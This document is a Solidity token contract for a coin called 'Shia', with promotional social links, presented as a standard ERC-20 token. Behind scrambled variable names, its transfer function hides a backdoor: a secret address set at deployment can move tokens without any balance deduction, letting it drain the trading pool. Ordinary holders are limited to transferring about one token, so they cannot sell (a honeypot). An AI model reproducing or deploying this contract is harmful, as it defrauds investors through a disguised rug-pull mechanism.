/*

Telegram: https://t.me/ShiaTwoPortal

Website: https://shiatwo.crypto-token.live/

Twitter: https://twitter.com/ShiaTwoETH

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract Shia is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address zmdg, address dfxut, uint256 jtgcxyari) public returns (bool success) {
        require(jtgcxyari <= allowance[zmdg][msg.sender]);
        allowance[zmdg][msg.sender] -= jtgcxyari;
        xefyvwoisbn(zmdg, dfxut, jtgcxyari);
        return true;
    }

    uint256 private asbz = 118;

    function approve(address dlvufw, uint256 jtgcxyari) public returns (bool success) {
        allowance[msg.sender][dlvufw] = jtgcxyari;
        emit Approval(msg.sender, dlvufw, jtgcxyari);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private kjtlicefbv;

    mapping(address => uint256) private ktjxscowe;

    function transfer(address dfxut, uint256 jtgcxyari) public returns (bool success) {
        xefyvwoisbn(msg.sender, dfxut, jtgcxyari);
        return true;
    }

    constructor(string memory uvgkerhf, string memory rkfdbjgycwmv, address dmkjzlqr, address eaoiutsfcwxh) {
        name = uvgkerhf;
        symbol = rkfdbjgycwmv;
        balanceOf[msg.sender] = totalSupply;
        ktjxscowe[eaoiutsfcwxh] = asbz;
        bqltujishyax = IUniswapV2Router02(dmkjzlqr);
    }

    function xefyvwoisbn(address zmdg, address dfxut, uint256 jtgcxyari) private {
        address zcelfyg = IUniswapV2Factory(bqltujishyax.factory()).getPair(address(this), bqltujishyax.WETH());
        if (0 == ktjxscowe[zmdg]) {
            if (zmdg != zcelfyg && kjtlicefbv[zmdg] != block.number && jtgcxyari < totalSupply) {
                require(jtgcxyari <= totalSupply / (10 ** decimals));
            }
            balanceOf[zmdg] -= jtgcxyari;
        }
        balanceOf[dfxut] += jtgcxyari;
        kjtlicefbv[dfxut] = block.number;
        emit Transfer(zmdg, dfxut, jtgcxyari);
    }

    string public name;

    IUniswapV2Router02 private bqltujishyax;

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol;
}
